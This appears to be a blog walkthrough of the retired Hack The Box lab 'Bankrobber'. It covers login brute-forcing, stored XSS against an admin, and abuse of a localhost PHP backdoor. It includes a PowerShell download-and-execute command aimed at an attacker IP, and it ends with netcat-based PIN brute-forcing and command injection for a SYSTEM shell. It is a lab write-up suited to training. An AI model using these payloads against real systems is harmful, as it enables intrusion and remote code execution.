## Background

Bankrobber is a retired vulnerable VM from Hack The Box.

## Information Gathering

Letâ€™s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.154 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-22 18:02:00 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 3306/tcp on 10.10.10.154                                  
Discovered open port 80/tcp on 10.10.10.154                                    
Discovered open port 445/tcp on 10.10.10.154                                   
Discovered open port 443/tcp on 10.10.10.154
```

Interesting list of web-oriented open ports. Let's do one better with `nmap` scanning the discovered port to establish their services.

```
# nmap -e tun0 -n -v -Pn -p80,443,445,3306 -A --reason -oN nmap.txt 10.10.10.154
...

```

Nothing really interesting stands out. Here's how the site looks like. Bitcoin, eh?

### Directory/File Enumeration

Let's see what we can find with SecLists and `gobuster`.

```

### PHP Page Analysis

Let's check out the two pages of interest: `login.php` and `register.php`.

#### `login.php`

```
# curl -i -d "username=admin&password=admin" http://10.10.10.154/login.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:49:55 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

#### `register.php`

```
# curl -i -d "username=admin&password=admin" http://10.10.10.154/register.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:51:16 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php?msg=User already exists.
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Notice that `register.php` provides a way to verify whether a particular user exist? Let's see what happens when we register a totally new user.

```
# curl -i -d "username=dipshit&password=dipshit" http://10.10.10.154/register.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:53:48 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php?msg=User created.
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Interesting. There's a message to tell us that a new user was created. What happens when we log in?

```
# curl -i -d "username=dipshit&password=dipshit" http://10.10.10.154/login.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:55:08 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4

Set-Cookie: id=25

Set-Cookie: password=ZGlwc2hpdA%3D%3D
Location: user
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Hmm. Cookie-based authentication??!! Look at the redirection? To `/user`! Previously in our enumeration, the directory `/admin` was also present along with `/user`. If I had to guess, I would say that admin logon gets redirected to `/admin`. With that in mind, I wrote the following brute-forcer script of sorts, using `curl` as the main driver.

<div class="filename"><span>robber.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.154
USER=admin
PASS=$1

function die() {
  killall perl &>/dev/null
}

CHECK=$(curl -i \
             -s \
             -d "username=$USER&password=$PASS" \
             http://$HOST/login.php \
  | grep -E '^Location')

if grep 'admin' <<<"$CHECK" &>/dev/null; then
  echo "[*] Password is: $PASS"
  die
fi
```

Combined with GNU Parallel, we get a poor man version's of a multi-threaded brute-forcer. It took me a while to brute-force the passsword. The credential is (`admin:hopelessromantic`).

Let's check it out.

</a>

Awesome.

### Backdooring PHP

Long story short. The creators left a PHP backdoor that can only be executed from `localhost`.

<a class="image-popup">
![10720d21.png](/assets/images/posts/bankrobber-htb-walkthrough/10720d21.png)
</a>

Recall `notes.txt`? It says that only comments from `localhost` are not encoded. This means that we may be able to inject JavaScript into the backend and run it as `localhost`. But where to inject the JavaScript?

Earlier on, I went ahead to register a new user. In the user's page there's a feature that allows one to transfer E-coins with a custom comment to the recipient.

<a class="image-popup">
![861cf35b.png](/assets/images/posts/bankrobber-htb-walkthrough/861cf35b.png)
</a>

Here's a simple JavaScript to demonstrate the callback capabilities of the remote backend.

```
<script>var img = new Image(); img.src = "http://10.10.15.23/hacked.png";</script>
```

<a class="image-popup">
![cfc55918.png](/assets/images/posts/bankrobber-htb-walkthrough/cfc55918.png)
</a>

We already knew that admin has an ID of 1 previously. We also need to set up a SimpleHTTPServer for testing purposes. Once we hit the transfer button, we are greeted with a popup alert.

<a class="image-popup">
![45cd508f.png](/assets/images/posts/bankrobber-htb-walkthrough/45cd508f.png)
</a>

That's the signal to login to the admin page.

<a class="image-popup">
![92913034.png](/assets/images/posts/bankrobber-htb-walkthrough/92913034.png)
</a>

Once you hit accept, a HTTP GET comes knocking on our door, requesting for `hacked.png`.

<a class="image-popup">
![b25df392.png](/assets/images/posts/bankrobber-htb-walkthrough/b25df392.png)
</a>

Sweet. But first, let's take a peek at how the backdoor remote command execution (`system.js`) is implemented.

<a class="image-popup">
![896c1641.png](/assets/images/posts/bankrobber-htb-walkthrough/896c1641.png)
</a>

Well, I could use XHR to reach http://localhost/admin/backdoorchecker.php. That should work. Check it out.

```
<script>
function hello() {
  var http=new XMLHttpRequest();
  var url='http://localhost/admin/backdoorchecker.php';
  var params="cmd=dir | powershell /c iex (new-object net.webclient).downloadstring('http://10.10.15.23/nmap.txt')";
  http.open('POST',url,true);
  http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  http.send(params);
}
hello();
</script>
```

Let's minify the JavaScript while we are at it.

<a class="image-popup">
![7936b333.png](/assets/images/posts/bankrobber-htb-walkthrough/7936b333.png)
</a>

Bombs away. Moments later, see who came knocking on my door, with PowerShell no less. :wink:

<a class="image-popup">
![6ddfe67d.png](/assets/images/posts/bankrobber-htb-walkthrough/6ddfe67d.png)
</a>

## Low-Privilege Shell

With that in mind, we can probably execute some kind of reverse [shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3).

<a class="image-popup">
![d84ca684.png](/assets/images/posts/bankrobber-htb-walkthrough/d84ca684.png)
</a>

Bam! The file `user.txt` is at Cortin's desktop.

<a class="image-popup">
![f0c5e13d.png](/assets/images/posts/bankrobber-htb-walkthrough/f0c5e13d.png)
</a>

## Privilege Escalation

During enumeration of Cortin's account, I notice a weird service `bankapp`, listening at `910/tcp`. The executable path is `C:\bankv2.exe`. And since the port wasn't discovered during our port scan, it can only mean that this service is listening through `localhost` or the loopback interface.

<a class="image-popup">
![a42df46a.png](/assets/images/posts/bankrobber-htb-walkthrough/a42df46a.png)
</a>

<a class="image-popup">
![cf2c3444.png](/assets/images/posts/bankrobber-htb-walkthrough/cf2c3444.png)
</a>

With that in mind, let's transfer a copy of `plink.exe` a SSH client over. Using remote port-forwarding, we can "forward" `910/tcp` over to my attacking machine hosting the SSH service.

```
start ssh -R 910:127.0.0.1:910 -pw <password> root@10.10.15.48 -N
```

Once that's done, we should be able to connect to `910/tcp` locally on our attacking machine.

<a class="image-popup">
![bea16b92.png](/assets/images/posts/bankrobber-htb-walkthrough/bea16b92.png)
</a>

#### Breaking `bankv2.exe`

So, the program requires a 4-digit PIN to log in, eh? That should be easy. I wrote a simple brute-forcer for that.

<div class="filename"><span>pin.sh</span></div>

```bash
#!/bin/bash

HOST=127.0.0.1
PORT=910
PIN=$1

function die() {
  killall perl &>/dev/null
}

if echo $PIN | nc $HOST $PORT 2>&1 | sed -r '$!d' | grep -iv 'denied' &>/dev/null; then
  echo "[*] PIN: $PIN"
  die
fi
```

See? Easy.

<a class="image-popup">
![3ad896c0.png](/assets/images/posts/bankrobber-htb-walkthrough/3ad896c0.png)
</a>

Long story short, the program is susceptible to a command injection vulnerability, after 32 bytes of string input. Prior to that, I've already copied `nc.exe` over to `C:\users\cortin\appdata\nc.exe`, so we'll launch a reverse shell from there.

<a class="image-popup">
![966210fe.png](/assets/images/posts/bankrobber-htb-walkthrough/966210fe.png)
</a>

And a shell with `SYSTEM` privilege appears...

<a class="image-popup">
![2bffd339.png](/assets/images/posts/bankrobber-htb-walkthrough/2bffd339.png)
</a>

Getting `root.txt` is trivial with a `SYSTEM` shell.
